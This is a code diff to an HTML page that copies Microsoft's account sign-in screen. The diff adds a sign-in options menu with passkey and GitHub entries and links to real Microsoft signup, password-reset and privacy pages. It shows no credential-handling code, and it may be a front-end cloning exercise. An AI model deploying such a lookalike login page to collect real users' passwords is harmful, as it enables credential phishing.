@@ -13,21 +13,43 @@
   <div class="main-box">
     <img id="logo-small" class="logotype" src="assets/images/logo_rect.svg" alt="company logotype">
     <div id="sign-in-title" class="sing-in-title">Sign in</div>
+    <div id="sign-in-options-title" class="sing-in-title">Sign-in options</div>
     <div id="error-message">Enter a valid email address, phone number, or Skype name.</div>
     <div id="entered-email">
       <img src="assets/images/arrow(left).svg" alt="arrow left" id="arrow" />
       <div id="enter-message"></div>
     </div>
+    <div class="sing-in-options-menu">
+      <div class="use-your-device">
+        <img src="assets/images/use-your-device-logo.svg" alt="use your device logo"/>
+        <div class="use-device-text">
+          <div class="sign-in-option-item-title">Face, fingerprint, PIN or security key</div>
+          <div class="sign-in-option-item-description">Use your device to sign in with a passkey.</div>
+        </div>
+        <img src="assets/images/question-mark-logo.svg" alt="question mark logo"/>
+      </div>
+      <div class="use-your-device">
+        <img src="assets/images/github-logo.svg" alt="use your device logo"/>
+        <div class="use-device-text">
+          <div class="sign-in-option-item-title">Sign In with GitHub</div>
+          <div class="sign-in-option-item-description">Personal accounts only</div>
+        </div>
+        <img src="assets/images/question-mark-logo.svg" alt="question mark logo"/>
+      </div>
+      <div class="use-github"></div>
+    </div>
     <div id="enter-pass-title" class="sing-in-title password">Enter password</div>
+
     <input id="input-email" type="email" class="data-input" placeholder="Email, phone, or Skype">
     <input id="input-password" type="password" class="data-input" placeholder="Password">
-    <div class="no-account">No account? <a class="create-account" href="#">Create one!</a></div>
+
+    <div class="no-account">No account? <a class="create-account" href="https://signup.live.com">Create one!</a></div>
     <a href="#" class="cant-access">Can't access your account?</a>
-    <a href="#" class="forgot-pass">Forgot my password</a>
+    <a href="https://passwordreset.microsoftonline.com" class="forgot-pass">Forgot my password</a>
     <div class="buttons-block">
-      <button class="button back">Back</button>
       <button class="button sign-in">Sign in</button>
       <button id="next-button" class="button">Next</button>
+      <button class="button back">Back</button>
     </div>
   </div>
   <div class="lower-block">
@@ -36,8 +58,8 @@
   </div>
 </main>
 <footer class="footer">
-  <div class="terms">Terms of use</div>
-  <div class="privacy-cookies">Privacy & cookies</div>
+  <div class="terms"><a target="_blank" href="https://www.microsoft.com/en-US/servicesagreement">Terms of use</a></div>
+  <div class="privacy-cookies"><a target="_blank" href="https://www.microsoft.com/en-US/privacy/privacystatement">Privacy & cookies</a></div>
   <a href="#" class="more">...</a>
 </footer>
 <script type="module" src="../src/App.js"></script>
